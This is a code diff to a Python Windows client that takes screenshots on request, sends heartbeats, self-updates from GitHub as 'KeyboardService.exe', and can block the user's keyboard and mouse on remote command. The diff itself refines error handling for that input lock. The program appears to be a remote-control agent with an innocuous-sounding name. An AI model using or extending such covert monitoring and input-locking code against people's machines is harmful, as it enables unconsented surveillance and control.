@@ -55,7 +55,7 @@ HEARTBEAT_INTERVAL_SECONDS = 12
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.0.0.0.04"
+APP_VERSION = "1.0.0.0.05"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/dablop/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -908,10 +908,10 @@ def open_message_document(message):
 
 def release_input_block(stop_event, ready_event, result, duration):
     global input_block_timer, input_block_stop_event
-    user32 = ctypes.windll.user32
-    user32.BlockInput.argtypes = [wintypes.BOOL]
-    user32.BlockInput.restype = wintypes.BOOL
     try:
+        user32 = ctypes.WinDLL("user32", use_last_error=True)
+        user32.BlockInput.argtypes = [wintypes.BOOL]
+        user32.BlockInput.restype = wintypes.BOOL
         if not user32.BlockInput(True):
             error_code = ctypes.get_last_error()
             result["error"] = OSError(error_code, ctypes.FormatError(error_code))
@@ -920,7 +920,9 @@ def release_input_block(stop_event, ready_event, result, duration):
         stop_event.wait(duration)
         if not user32.BlockInput(False):
             error_code = ctypes.get_last_error()
-            print(f"Could not release Windows input block: {error_code}: {ctypes.FormatError(error_code)}")
+            result["release_error"] = OSError(error_code, ctypes.FormatError(error_code))
+    except Exception as error:
+        result["error"] = error
     finally:
         ready_event.set()
         if input_block_stop_event is stop_event:
@@ -961,6 +963,11 @@ def _handle_block_input(message):
     input_block_timer = new_input_block_timer
     new_input_block_timer.start()
     ready_event.wait(timeout=5)
+    if not ready_event.is_set():
+        stop_event.set()
+        input_block_timer = None
+        input_block_stop_event = None
+        raise RuntimeError("Input block worker did not start within 5 seconds")
     if result.get("error"):
         new_input_block_timer.join(timeout=2)
         input_block_timer = None
